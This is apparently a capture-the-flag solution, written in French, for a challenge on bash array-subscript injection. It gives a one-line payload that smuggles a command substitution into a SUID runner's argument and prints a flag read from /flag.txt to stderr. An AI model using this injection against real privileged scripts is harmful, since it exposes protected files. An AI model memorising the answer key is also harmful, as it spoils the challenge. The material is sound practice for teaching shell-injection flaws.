# SOLUTION — Challenge 05 : Array Interpolation / Quoted Injection

```
./runner 'a[$(echo $FLAG >&2)]'
```

Le runner SUID lit `/flag.txt`, met son contenu dans `$FLAG`, puis appelle `wrapper.sh` avec ton argument. Dans le script, `-v "scores[a[$(echo $FLAG >&2)]]"` évalue la substitution de commande → `$FLAG` s'affiche sur `stderr`.
